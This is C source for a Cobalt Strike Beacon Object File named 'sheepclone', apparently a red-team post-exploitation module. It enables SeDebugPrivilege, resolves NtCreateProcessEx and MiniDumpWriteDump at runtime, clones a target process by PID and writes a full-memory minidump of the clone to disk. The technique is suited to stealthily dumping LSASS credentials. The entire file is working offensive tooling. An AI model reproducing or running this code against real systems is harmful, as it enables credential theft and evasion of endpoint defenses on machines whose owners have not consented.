/*
Authors:
    https://github.com/nicbrinkley
    https://github.com/SnoopJesus420
*/

/*
* Compile with:
* cl.exe /c /GS- BOF-main.c /Fosheepclone.x64.o
*/

#include <Windows.h>
#include <TlHelp32.h>
#include "beacon.h"

// Imported WIN32 API
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(void);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupPrivilegeNameW(LPCWSTR, PLUID, LPWSTR, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PLUID);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleW(LPCWSTR);
DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryW(LPCWSTR);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetProcessId(HANDLE);
DECLSPEC_IMPORT void* WINAPI MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void WINAPI MSVCRT$free(void*);
DECLSPEC_IMPORT int WINAPI MSVCRT$wcscmp(const wchar_t*, const wchar_t*);

// Define STATUS_SUCCESS if not already defined
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

// Define NTSTATUS if not already defined
#ifndef NTSTATUS
typedef _Return_type_success_(return >= 0) LONG NTSTATUS;
#endif

// Define NTAPI if not already defined
#ifndef NTAPI
#define NTAPI __stdcall
#endif

// Define UNICODE_STRING structure
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

// Define CLIENT_ID structure
typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

// Define OBJECT_ATTRIBUTES structure
typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

// Define NtOpenProcess function pointer type
typedef NTSTATUS(NTAPI* PNtOpenProcess)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId
    );

// Global function pointer for NtOpenProcess
static PNtOpenProcess pNtOpenProcess = NULL;

// Define NtCreateProcessEx function pointer type
typedef NTSTATUS(NTAPI* PNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE TokenHandle,
    ULONG JobMemberLevel
    );

// Global function pointer for NtCreateProcessEx
static PNtCreateProcessEx pNtCreateProcessEx = NULL;

// Minimal MINIDUMP_TYPE definition and MiniDumpWriteDump signature
typedef enum _MINIDUMP_TYPE {
    MiniDumpNormal = 0x00000000,
    MiniDumpWithDataSegs = 0x00000001,
    MiniDumpWithFullMemory = 0x00000002,
    MiniDumpWithHandleData = 0x00000004,
    MiniDumpFilterMemory = 0x00000008,
    MiniDumpScanMemory = 0x00001000,
    MiniDumpWithUnloadedModules = 0x00000020,
    MiniDumpWithIndirectlyReferencedMemory = 0x00000040,
    MiniDumpFilterModulePaths = 0x00000080,
    MiniDumpWithProcessThreadData = 0x00000100,
    MiniDumpWithPrivateReadWriteMemory = 0x00000200,
    MiniDumpWithoutOptionalData = 0x00000400,
    MiniDumpWithFullMemoryInfo = 0x00000800,
    MiniDumpWithThreadInfo = 0x00001000,
    MiniDumpWithCodeSegs = 0x00002000,
    MiniDumpWithoutAuxiliaryState = 0x00004000,
    MiniDumpWithFullAuxiliaryState = 0x00008000,
    MiniDumpWithPrivateWriteCopyMemory = 0x00010000,
    MiniDumpIgnoreInaccessibleMemory = 0x00020000,
    MiniDumpWithTokenInformation = 0x00040000,
    MiniDumpWithModuleHeaders = 0x00080000,
    MiniDumpFilterTriage = 0x00100000,
    MiniDumpValidTypeFlags = 0x001fffff
} MINIDUMP_TYPE;

typedef BOOL(WINAPI* PMiniDumpWriteDump)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PVOID ExceptionParam,
    PVOID UserStreamParam,
    PVOID CallbackParam
    );

static PMiniDumpWriteDump pMiniDumpWriteDump = NULL;

// Check if a privilege is already enabled
BOOL IsPrivilegeEnabled(LPCWSTR privilegeName) {
    HANDLE tokenHandle = NULL;
    DWORD bufferSize = 0;
    PTOKEN_PRIVILEGES privileges = NULL;
    BOOL found = FALSE;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &tokenHandle)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed in IsPrivilegeEnabled! Error: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    ADVAPI32$GetTokenInformation(tokenHandle, TokenPrivileges, NULL, 0, &bufferSize);
    privileges = (PTOKEN_PRIVILEGES)MSVCRT$malloc(bufferSize);
    if (!privileges) {
        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed");
        KERNEL32$CloseHandle(tokenHandle);
        return FALSE;
    }

    if (!ADVAPI32$GetTokenInformation(tokenHandle, TokenPrivileges, privileges, bufferSize, &bufferSize)) {
        BeaconPrintf(CALLBACK_ERROR, "GetTokenInformation failed! Error: %lu", KERNEL32$GetLastError());
        MSVCRT$free(privileges);
        KERNEL32$CloseHandle(tokenHandle);
        return FALSE;
    }

    for (DWORD i = 0; i < privileges->PrivilegeCount; i++) {
        WCHAR name[256];
        DWORD nameSize = sizeof(name) / sizeof(WCHAR);
        if (ADVAPI32$LookupPrivilegeNameW(NULL, &privileges->Privileges[i].Luid, name, &nameSize)) {
            if (MSVCRT$wcscmp(name, privilegeName) == 0) {
                found = TRUE;
                if (privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) {
                    BeaconPrintf(CALLBACK_OUTPUT, "Privilege '%s' is already enabled (Attributes: 0x%lx)", privilegeName, privileges->Privileges[i].Attributes);
                    MSVCRT$free(privileges);
                    KERNEL32$CloseHandle(tokenHandle);
                    return TRUE;
                }
                break;
            }
        }
    }

    MSVCRT$free(privileges);
    KERNEL32$CloseHandle(tokenHandle);
    if (!found) {
        BeaconPrintf(CALLBACK_ERROR, "Privilege '%s' not found in process token", privilegeName);
        return FALSE;
    }
    return FALSE;
}

// Enable Token Privileges
BOOL EnablePrivilege() {
    LPCWSTR privilegeName = L"SeDebugPrivilege";
    HANDLE tokenHandle;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (IsPrivilegeEnabled(privilegeName)) {
        BeaconPrintf(CALLBACK_OUTPUT, "No need to enable '%s'; it is already enabled", privilegeName);
        return TRUE;
    }

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken Failed! Error: %lu", KERNEL32$GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Got Token handle: %p", tokenHandle);

    if (!ADVAPI32$LookupPrivilegeValueW(NULL, privilegeName, &luid)) {
        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValueW Failed for '%s'! Error: %lu", privilegeName, KERNEL32$GetLastError());
        KERNEL32$CloseHandle(tokenHandle);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BeaconPrintf(CALLBACK_OUTPUT, "Adjusting token privileges...");
    if (!ADVAPI32$AdjustTokenPrivileges(tokenHandle, FALSE, &tp, 0, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges Failed! Error: %lu", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(tokenHandle);
        return FALSE;
    }

    if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        BeaconPrintf(CALLBACK_ERROR, "Privilege not held by process token! Error: %lu", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(tokenHandle);
        return FALSE;
    }

    KERNEL32$CloseHandle(tokenHandle);
    BeaconPrintf(CALLBACK_OUTPUT, "Successfully enabled '%s'", privilegeName);
    return TRUE;
}

// Load NtOpenProcess function from ntdll.dll
BOOL LoadNtOpenProcess() {
    HMODULE hNtdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
    if (hNtdll == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get handle to ntdll.dll! Error: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    pNtOpenProcess = (PNtOpenProcess)KERNEL32$GetProcAddress(hNtdll, "NtOpenProcess");
    if (pNtOpenProcess == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get address of NtOpenProcess! Error: %lu", KERNEL32$GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Successfully loaded NtOpenProcess from ntdll.dll");
    return TRUE;
}

// Load NtCreateProcessEx from ntdll.dll
BOOL LoadNtCreateProcessEx() {
    HMODULE hNtdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
    if (hNtdll == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get handle to ntdll.dll! Error: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    pNtCreateProcessEx = (PNtCreateProcessEx)KERNEL32$GetProcAddress(hNtdll, "NtCreateProcessEx");
    if (pNtCreateProcessEx == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get address of NtCreateProcessEx! Error: %lu", KERNEL32$GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Successfully loaded NtCreateProcessEx from ntdll.dll");
    return TRUE;
}

// Load MiniDumpWriteDump from Dbghelp.dll
BOOL LoadMiniDumpWriteDump() {
    HMODULE hDbgHelp = KERNEL32$LoadLibraryW(L"Dbghelp.dll");
    if (hDbgHelp == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to load Dbghelp.dll! Error: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    pMiniDumpWriteDump = (PMiniDumpWriteDump)KERNEL32$GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (pMiniDumpWriteDump == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get address of MiniDumpWriteDump! Error: %lu", KERNEL32$GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Successfully loaded MiniDumpWriteDump from Dbghelp.dll");
    return TRUE;
}

// Find Process Function
DWORD FindProcess(DWORD pid) {
    HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create snapshot! Error Code: %u", KERNEL32$GetLastError());
        return 0;
    }

    PROCESSENTRY32 pe32 = { sizeof(pe32) };
    DWORD foundPid = 0;

    if (KERNEL32$Process32First(snapshot, &pe32)) {
        do {
            if (pe32.th32ProcessID == pid) {
                foundPid = pid;
                break;
            }
        } while (KERNEL32$Process32Next(snapshot, &pe32));
    }

    KERNEL32$CloseHandle(snapshot);
    return foundPid;
}

// Function to open a handle to the target process
NTSTATUS OpenProcessByPID(DWORD pid, PHANDLE hProcess) {
    OBJECT_ATTRIBUTES parentProcessObjectAttributes;
    CLIENT_ID parentProcessClientId;
    NTSTATUS ntStatus;

    parentProcessObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    parentProcessObjectAttributes.RootDirectory = NULL;
    parentProcessObjectAttributes.ObjectName = NULL;
    parentProcessObjectAttributes.Attributes = 0;
    parentProcessObjectAttributes.SecurityDescriptor = NULL;
    parentProcessObjectAttributes.SecurityQualityOfService = NULL;

    parentProcessClientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    parentProcessClientId.UniqueThread = NULL;

    ntStatus = pNtOpenProcess(
        hProcess,
        PROCESS_CREATE_PROCESS,
        &parentProcessObjectAttributes,
        &parentProcessClientId
    );

    return ntStatus;
}

// Clone a process using NtCreateProcessEx
NTSTATUS CloneProcess(HANDLE hParentProcess, PHANDLE hCloneProcess) {
    OBJECT_ATTRIBUTES cloneObjectAttributes;

    cloneObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    cloneObjectAttributes.RootDirectory = NULL;
    cloneObjectAttributes.ObjectName = NULL;
    cloneObjectAttributes.Attributes = 0;
    cloneObjectAttributes.SecurityDescriptor = NULL;
    cloneObjectAttributes.SecurityQualityOfService = NULL;

    return pNtCreateProcessEx(
        hCloneProcess,
        PROCESS_ALL_ACCESS,
        &cloneObjectAttributes,
        hParentProcess,
        0,
        NULL,
        NULL,
        NULL,
        0
    );
}

void go(char* args, int length) {
    datap parser;
    DWORD processToClonePid = 0;
    char* dumpPath = NULL;
    HANDLE hParentProcess = NULL;
    HANDLE hCloneProcess = NULL;
    HANDLE hDumpFile = INVALID_HANDLE_VALUE;
    NTSTATUS ntStatus;

    // Parse arguments
    BeaconDataParse(&parser, args, length);
    processToClonePid = BeaconDataInt(&parser);
    dumpPath = BeaconDataExtract(&parser, NULL);

    // Validate arguments
    if (!processToClonePid || !dumpPath) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: sheepclone <PID> <DUMP_PATH>");
        return;
    }

    // Validate PID
    if (processToClonePid <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "PID must be a positive number!");
        return;
    }

    // Find Process
    if (FindProcess(processToClonePid) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Target Process with PID %u Not Found!", processToClonePid);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Process with PID %u found!", processToClonePid);

    // Load required functions
    BeaconPrintf(CALLBACK_OUTPUT, "Loading NtOpenProcess function...");
    if (!LoadNtOpenProcess()) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to load NtOpenProcess function!");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Loading NtCreateProcessEx function...");
    if (!LoadNtCreateProcessEx()) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to load NtCreateProcessEx function!");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Loading MiniDumpWriteDump...");
    if (!LoadMiniDumpWriteDump()) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to load MiniDumpWriteDump!");
        return;
    }

    // Enable SeDebugPrivilege
    BeaconPrintf(CALLBACK_OUTPUT, "Checking token privileges...");
    if (!EnablePrivilege()) {
        BeaconPrintf(CALLBACK_ERROR, "EnablePrivilege Failed!!!");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Privilege operation completed");

    // Open target process
    ntStatus = OpenProcessByPID(processToClonePid, &hParentProcess);
    if (hParentProcess == NULL || ntStatus != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open target process! NTSTATUS: 0x%08X", ntStatus);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Target process opened; handle: 0x%p", hParentProcess);

    // Clone the target process
    ntStatus = CloneProcess(hParentProcess, &hCloneProcess);
    if (hCloneProcess == NULL || ntStatus != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to clone target process! NTSTATUS: 0x%08X", ntStatus);
        KERNEL32$CloseHandle(hParentProcess);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Clone process created; handle: 0x%p", hCloneProcess);

    // Open dump file
    hDumpFile = KERNEL32$CreateFileA(
        dumpPath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hDumpFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create dump file at '%s'! Error: %lu", dumpPath, KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hCloneProcess);
        KERNEL32$CloseHandle(hParentProcess);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Dump file opened. Writing minidump...");

    // Compose dump type
    MINIDUMP_TYPE dumpType =
        (MINIDUMP_TYPE)(
            MiniDumpWithFullMemory |
            MiniDumpWithHandleData |
            MiniDumpWithUnloadedModules |
            MiniDumpWithFullMemoryInfo |
            MiniDumpWithThreadInfo |
            MiniDumpWithTokenInformation |
            MiniDumpWithProcessThreadData |
            MiniDumpWithModuleHeaders |
            MiniDumpIgnoreInaccessibleMemory
            );

    // Write the minidump
    if (!pMiniDumpWriteDump(hCloneProcess, KERNEL32$GetProcessId(hCloneProcess), hDumpFile, dumpType, NULL, NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "MiniDumpWriteDump failed! Error: %lu", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hDumpFile);
        KERNEL32$CloseHandle(hCloneProcess);
        KERNEL32$CloseHandle(hParentProcess);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Minidump successfully written to '%s'", dumpPath);

    // Cleanup
    KERNEL32$CloseHandle(hDumpFile);
    KERNEL32$CloseHandle(hCloneProcess);
    KERNEL32$CloseHandle(hParentProcess);
}
